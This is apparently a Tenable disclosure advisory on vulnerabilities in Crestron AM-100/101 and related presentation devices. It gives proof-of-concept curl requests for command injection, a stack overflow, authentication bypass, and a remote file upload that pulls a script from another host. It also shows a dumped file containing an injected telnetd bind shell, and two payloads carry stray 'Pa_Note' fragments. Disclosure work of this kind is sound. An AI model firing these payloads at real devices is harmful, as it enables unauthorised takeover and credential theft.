# OEM Presentation Platform Vulnerabilities

Critical

[← View More Research Advisories](/security/research)
### Synopsis

Tenable found multiple vulnerabilities while investigating a Crestron AM-100. Tenable also discovered that the Crestron AM-100 shared a code base with the Barco wePresent, Extron ShareLink, InFocus LiteShow, TEQ AV IT WIPS710, SHARP PN-L703WA, Optoma WPS-Pro, Blackbox HD WPS, and possibly others. The vulnerabilities listed below **do not** affect all devices. Tenable has done its best to specifically call out which platforms are affected by each vulnerability.

#### CVE-2019-3925: SNMP Command Injection #1

A remote, unauthenticated attacker can inject operating system commands on the Crestron AM-100 with firmware 1.6.0.2 and AM-101 with firmware 2.7.0.2. The vulnerability occurs over SNMP via the iso.3.6.1.4.1.3212.100.3.2.9.3 OID. The command injection is the result of shelling out to */bin/ftpfw.sh*.

![](/sites/drupal.dmz.tenablesecurity.com/files/files/advisory/cve_2019_3925.png)
#### CVE-2019-3926: SNMP Command Injection #2

A remote, unauthenticated attacker can inject operating system commands on theCrestron AM-100 with firmware 1.6.0.2 and AM-101 with firmware 2.7.0.2. The vulnerability occurs over SNMP via the iso.3.6.1.4.1.3212.100.3.2.14.1 OID. The command injection is the result of shelling out to */bin/getRemoteURL.sh*.

#### CVE-2019-3927: Unauthenticated Admin Password Change via SNMP

A remote, unauthenticated attacker can change the admin and moderator passwords for the web interface on the Crestron AM-100 with firmware 1.6.0.2 and AM-101 with firmware 2.7.0.2. The vulnerability occurs over SNMP via the iso.3.6.1.4.1.3212.100.3.2.8.1 and iso.3.6.1.4.1.3212.100.3.2.8.2 OIDs. The following proof of concept shows the user logging in with the default "admin" password and then with the a new password.

#### CVE-2019-3928: Presentation Code Leak via SNMP

A remote, unauthenticated attacker can acquire the presentation code on the Crestron AM-100 with firmware 1.6.0.2 and AM-101 with firmware 2.7.0.2. The vulnerability occurs over SNMP via the iso.3.6.1.4.1.3212.100.3.2.7.4. The code allows the attacker to view locked presentations or become a presenter.

#### CVE-2019-3929: Unauthenticated Remote Command Injection via HTTP

A remote, unauthenticated attacker can execute operating system commands as root via crafted requests to the HTTP endpoint file\_transfer.cgi. This vulnerability appears to affect all known devices including the Crestron AM-100 firmware 1.6.0.2, Crestron AM-101 firmware 2.7.0.1, Barco wePresent WiPG-1000 firmware 2.3.0.10, Barco wePresent WiPG-1600 before firmware 2.4.1.19, Extron ShareLink 200/250 firmware 2.0.3.4, Teq AV IT WIPS710 firmware 1.1.0.7, SHARP PN-L703WA firmware 1.4.2.3, Optoma WPS-Pro firmware 1.0.0.5, Blackbox HD WPS firmware 1.0.0.5, InFocus LiteShow3 firmware 1.0.16, and InFocus LiteShow4 2.0.0.7

![](/sites/drupal.dmz.tenablesecurity.com/files/files/advisory/cve_2019_3929.png)
#### CVE-2019-3930: Unauthenticated Remote Stack Buffer Overflow via HTTP

The function **PARSERtoCHAR** in *libAwCgi.so* is called by the HTTP cgi scripts in multiple contexts. Sometimes without authentication (file\_transfer.cgi) and sometimes with authentication (return.cgi). CGI scripts that pass this function input that exceeds 0x100 bytes overflow a stack buffer. The following proof of concept shows a remote, unauthenticated attacker triggering this bug.

```

curl -v --header "Content-Type: application/x-www-form-urlencoded" \
--request POST \
--data "file_transfer=new&dir=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaPa_NoteaaaaaaaaaaaaaaPa_Noteaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
--insecure https://192.168.88.250/cgi-bin/file_transfer.cgi

```

Which generates the following back trace:

```

Core was generated by `/home/boa/cgi-bin/file_transfer.cgi'.
Program terminated with signal SIGSEGV, Segmentation fault.

```

This vulnerability appears to affect all known devices including the Crestron AM-100 firmware 1.6.0.2, Crestron AM-101 firmware 2.7.0.1, Barco wePresent WiPG-1000 firmware 2.3.0.10, Barco wePresent WiPG-1600 before firmware 2.4.1.19, Extron ShareLink 200/250 firmware 2.0.3.4, Teq AV IT WIPS710 firmware 1.1.0.7, SHARP PN-L703WA firmware 1.4.2.3, Optoma WPS-Pro firmware 1.0.0.5, Blackbox HD WPS firmware 1.0.0.5, InFocus LiteShow3 firmware 1.0.16, and InFocus LiteShow4 2.0.0.7.

#### CVE-2019-3931: Authenticated Remote File Upload via HTTP

The Crestron AM-100 1.6.0.2 and AM-101 2.7.0.1 received a patch to fix CVE-2017-16709. The patch attempted to filter out operating system commands to prevent command injection. However, this patch was not entirely successful and authenticated attackers can still provide arbitrary parameters to curl. This allows authenticated attackers to upload any file to the device. Furthermore, the /home/boa/cgi-bin/ directory is writeable which allows the attacker to easily achieve code execution.

The following proof of concept:

```

curl --header "Content-Type: application/x-www-form-urlencoded" \
--request POST \
--data "command=<Send><seid>fAEI0CHTDTHKcDVD</seid><upload><protocol>ftp</protocol><address>http://192.168.88.248:1270Pa_Note http://192.168.88.248:1270/lol.cgi -o /home/boa/cgi-bin/file_transfer.cgi</address><port>1270</port><account>lol</account><password>lol</password><logo>/tmp/wat</logo></upload></Send>" \
--insecure https://192.168.88.250/cgi-bin/return.cgi

```

Will cause the following command to be executed on the device:

```

sh /usr/bin/curl -k -o /tmp/Example.ogg http://192.168.88.248:1270; http://192.168.88.248:1270/lol.cgi -o /home/boa/cgi-bin/file_transfer.cgi

```

Where lol.cgi is the file to upload and file\_transfer.cgi is the file to overwrite

#### CVE-2019-3932: Authentication Bypass in return.tgi

The *return.tgi* script in */home/boa/tgi/* allows remote attackers to bypass authentication with a hardcoded sessionID of **trLVy9Gh82KDHoy** on the Crestron AM-100 with firmware 1.6.0.2 and AM-101 with firmware 2.7.0.2. The return.tgi controls external devices via the uart\_bridge. A sample bypass follows:

```

curl --header "Content-Type: application/x-www-form-urlencoded" \
--request POST \
--data "command=session&trLVy9Gh82KDHoy9&beef100500    2222010005"
--insecure https://192.168.88.250/tgi/return.tgi

```
#### CVE-2019-3933: Remote View Login Bypass #1

An unauthenticated, remote attacker can bypass the remote view "login" (pictured in CVE-2019-3928) simply by navigating to *http://[ip address]/images/browserslide.jpg*. The final image of a screenshare will also be cached at that location even after the presentation has finished. If a presentation has not occurred since a reboot then this page will be a 404. This vulnerability is known to affect the Crestron AM-100 firmware 1.6.0.2 and Crestron AM-101 firmware 2.7.0.1.

![](/sites/drupal.dmz.tenablesecurity.com/files/files/advisory/cve_2019_3933.png)
#### CVE-2019-3934: Remove View Login Bypass #2

An unauthenticated, remote attacker can bypass the remote view "login" (pictured in CVE-2019-3928) and down slide images by executing the following HTTP request:

```

curl --header "Content-Type: application/x-www-form-urlencoded" \
--request POST \
--data "BROWSER=client" \
--insecure "https://192.168.88.250/cgi-bin/login.cgi?lang=en&src=lol.html" > slideshow_img.jpg

```

This vulnerability is known to affect the Crestron AM-100 firmware 1.6.0.2 and Crestron AM-101 firmware 2.7.0.1

#### CVE-2019-3935: Unauthenticated Remote Moderator Controls

An unauthenticated, remote attacker can stop, start, and disconnect any screen sharing session due to insufficient authentication checking in the moderator controls. The following commands demonstrate this functionality in the Crestron AM-100 firmware 1.6.0.2 and Crestron AM-101 firmware 2.7.0.1. Note that the first request provides the attacker with the "primary key" for the screen share session.

```

albinolobster@ubuntu:~$ curl --header "Content-Type: application/x-www-form-urlencoded" --request POST --data "conference" --insecure "https://192.168.88.250/cgi-bin/conference.cgi?lang=en&src=lol.html"
3000192.168.88.24741
albinolobster@ubuntu:~$ curl --header "Content-Type: application/x-www-form-urlencoded" --request POST --data "userid=4&action=Stop" --insecure "https://192.168.88.250/cgi-bin/conference.cgi?lang=en&src=lol.html"
success
albinolobster@ubuntu:~$ curl --header "Content-Type: application/x-www-form-urlencoded" --request POST --data "userid=4&action=PlayImage" --insecure "https://192.168.88.250/cgi-bin/conference.cgi?lang=en&src=lol.html"
success
albinolobster@ubuntu:~$ curl --header "Content-Type: application/x-www-form-urlencoded" --request POST --data "userid=4&action=Disconnect" --insecure "https://192.168.88.250/cgi-bin/conference.cgi?lang=en&src=lol.html"
success

```
#### CVE-2019-3936: Unauthenticated Remote View Denial of Service

An unauthenticated, remote attacker can stop a screen share by sending the string *wppcmd\x00\x00\xa0\x00\x00\x00* to TCP port 389. The request takes about 2 minutes to go through, but after that time period the screen share transitions into the "Stopped" state.

#### CVE-2019-3937: Credentials Stored in Plaintext

The file */tmp/scfgdndf* stores usernames, passwords, and more in plaintext. Maybe under normal circumstances this wouldn't be too concerning, but with multiple unauthenticated vulnerabilities affecting the devices, including a file inclusion vulnerability, this becomes more concerning. The following is a sample of the files contents. Note that "modpass" and "adminpass" were the passwords in use at the time of dumping this file.

```

  /tmp # strings /tmp/scfgdndf
  WPS820 100111101110001
  Crestron AirMedia
  WiPG1K5s
  8888
  #FFFFFF
  AirMedia-0e58c9
  default
  AM-100
  user
  trainer
  admin
  sh -b 0.0.0.0:1270
  private

  modpass
  adminpass
  http://192.168.88.253:1270;telnetd -l /bin/sh -b 0.0.0.0:1270

```

This vulnerability is known to affect the Crestron AM-100 firmware 1.6.0.2 and Crestron AM-101 firmware 2.7.0.1.

#### CVE-2019-3938: Exported Credentials Recoverable

The platform allows the administrator to export and import configuration files. The device stores user credentials in the configuration file. The configuration file is easily decoded using the vendor's **awenc** tool. After decoding, the admin password is revealed ("lolwat" in the PoC below). This vulnerability is known to affect the Crestron AM-100 firmware 1.6.0.2 and Crestron AM-101 firmware 2.7.0.1.

```

albinolobster@ubuntu:~$ sudo chroot . ./qemu-arm-static /bin/awenc -h

```
#### CVE-2019-3939: Default Credentials

The devices use the default credentials "admin:admin" for the admin user and "moderator:moderator" for the moderator user.

#### CVE-2017-16709: Authenticated Command Injection

In June 2018, Crestron patched an authenticated, remote command injection vulnerability which was assigned [CVE-2017-16709](https://nvd.nist.gov/vuln/detail/CVE-2017-16709). Through patch analysis, Tenable believes this vulnerability is a command injection via HTTP. Analysis of the other devices indicated they had **not** patched this vulnerability.

### Solution
